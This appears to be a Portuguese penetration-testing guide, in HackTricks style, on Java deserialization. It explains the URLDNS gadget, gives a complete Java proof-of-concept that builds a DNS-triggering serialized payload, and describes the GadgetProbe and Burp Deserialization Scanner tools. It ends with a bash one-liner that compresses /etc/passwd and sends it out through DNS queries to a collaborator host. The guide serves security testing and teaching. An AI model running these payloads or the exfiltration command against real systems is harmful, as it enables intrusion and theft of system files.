# Java DNS Deserialization, GadgetProbe e Java Deserialization Scanner

{{#include ../../banners/hacktricks-training.md}}

## Requisição DNS na deserialização

A classe `java.net.URL` implementa `Serializable`, isso significa que esta classe pode ser serializada.
```java
public final class URL implements java.io.Serializable {
```
Esta classe tem um **comportamento curioso.** Da documentação: “**Dois hosts são considerados equivalentes se ambos os nomes dos hosts puderem ser resolvidos nos mesmos endereços IP**”.\
Então, toda vez que um objeto URL chama **qualquer** uma das **funções `equals`** ou **`hashCode`**, uma **solicitação DNS** para obter o endereço IP será **enviada**.

**Chamar** a função **`hashCode`** **de** um objeto **URL** é bastante fácil, basta inserir este objeto dentro de um `HashMap` que será desserializado. Isso ocorre porque **no final** da função **`readObject`** do `HashMap`, este código é executado:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
Está **indo** **executar** `putVal` com cada valor dentro do `HashMap`. Mas, mais relevante é a chamada para `hash` com cada valor. Este é o código da função `hash`:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
Como você pode observar, **ao desserializar** um **`HashMap`**, a função `hash` será **executada com cada objeto** e **durante** a execução do **`hash`**, **será executado** `.hashCode()` do objeto. Portanto, se você **desserializar** um **`HashMap`** **contendo** um objeto **URL**, o **objeto URL** irá **executar** `.hashCode()`.

Agora, vamos dar uma olhada no código de `URLObject.hashCode()`:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
Como você pode ver, quando um `URLObject` executa `.hashCode()`, é chamado `hashCode(this)`. A continuação você pode ver o código desta função:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
Você pode ver que um `getHostAddress` é executado para o domínio, **lançando uma consulta DNS**.

Portanto, esta classe pode ser **abusada** para **lançar** uma **consulta DNS** para **demonstrar** que **desserialização** é possível, ou até mesmo para **exfiltrar informações** (você pode anexar como subdomínio a saída de uma execução de comando).

### Exemplo de código de payload URLDNS

Você pode encontrar o [código de payload URDNS do ysoserial aqui](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java). No entanto, apenas para facilitar a compreensão de como codificá-lo, eu criei meu próprio PoC (baseado no do ysoserial):
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### Mais informações

- [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
- Na ideia original, o payload de commons collections foi alterado para realizar uma consulta DNS, isso era menos confiável do que o método proposto, mas este é o post: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

Você pode baixar [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) da Burp Suite App Store (Extender).

**GadgetProbe** tentará descobrir se algumas **classes Java existem** na classe Java do servidor para que você possa saber **se** ela é **vulnerável** a algum exploit conhecido.

### Como funciona

**GadgetProbe** usará o mesmo **payload DNS da seção anterior**, mas **antes** de executar a consulta DNS, ele **tentará desserializar uma classe arbitrária**. Se a **classe arbitrária existir**, a **consulta DNS** será **enviada** e o GadgetProbe anotará que essa classe existe. Se a **requisição DNS** **nunca for enviada**, isso significa que a **classe arbitrária não foi desserializada** com sucesso, então ou ela não está presente ou não é **serializável/explorável**.

Dentro do github, [**GadgetProbe tem algumas listas de palavras**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) com classes Java para serem testadas.

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../images/intruder4 (1) (1).gif>)

### Mais Informações

- [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Scanner de Desserialização Java

Este scanner pode ser **baixado** da Burp App Store (**Extender**).\
A **extensão** tem **capacidades** passivas e ativas.

### Passivo

Por padrão, ele **verifica passivamente** todas as requisições e respostas enviadas **procurando** por **bytes mágicos serializados Java** e apresentará um aviso de vulnerabilidade se algum for encontrado:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../images/image (765).png>)

### Ativo

**Teste Manual**

Você pode selecionar uma requisição, clicar com o botão direito e `Enviar requisição para DS - Teste Manual`.\
Então, dentro da aba _Deserialization Scanner_ --> _Manual testing tab_ você pode selecionar o **ponto de inserção**. E **iniciar o teste** (Selecione o ataque apropriado dependendo da codificação utilizada).

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../images/3-1.png)

Mesmo que isso seja chamado de "Teste Manual", é bastante **automatizado**. Ele verificará automaticamente se a **desserialização** é **vulnerável** a **qualquer payload ysoserial**, verificando as bibliotecas presentes no servidor web e destacará as vulneráveis. Para **verificar** as **bibliotecas vulneráveis**, você pode optar por lançar **Javas Sleeps**, **sleeps** via **consumo de CPU**, ou usando **DNS**, como foi mencionado anteriormente.

**Exploração**

Uma vez que você tenha identificado uma biblioteca vulnerável, pode enviar a requisição para a aba _Exploiting_.\
Nesta aba, você deve **selecionar** novamente o **ponto de injeção**, **escrever** a **biblioteca vulnerável** para a qual deseja criar um payload e o **comando**. Então, basta pressionar o botão de **Ataque** apropriado.

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../images/4.png)

### Informações de Exfiltração DNS de Desserialização Java

Faça seu payload executar algo como o seguinte:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### Mais Informações

- [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
